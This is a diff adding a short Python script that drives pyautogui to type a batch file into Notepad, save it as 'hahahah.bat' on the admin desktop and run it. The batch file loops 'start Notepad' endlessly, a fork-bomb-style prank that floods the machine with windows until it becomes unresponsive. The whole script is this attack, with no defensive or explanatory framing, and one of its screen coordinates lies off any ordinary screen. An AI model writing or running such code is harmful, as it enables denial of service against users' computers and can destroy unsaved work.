@@ -1,0 +1,24 @@
+import pyautogui, time, subprocess, os
+
+# Start Notepad
+subprocess.Popen("notepad.exe")
+time.sleep(.1)
+atext = """
+:loop
+start Notepad
+goto loop
+"""
+pyautogui.write(atext)
+time.sleep(.1)
+pyautogui.hotkey(("ctrl", "s"))
+pyautogui.moveTo(913,4564, duration=.1)
+time.sleep(.1)
+pyautogui.doubleClick()
+time.sleep(.1)
+pyautogui.hotkey("Backspace")
+time.sleep(.5)
+pyautogui.write("hahahah.bat")
+time.sleep(0.1)
+pyautogui.press("enter")
+os.system("start c:/users/admin/Desktop/hahahah.bat")
+
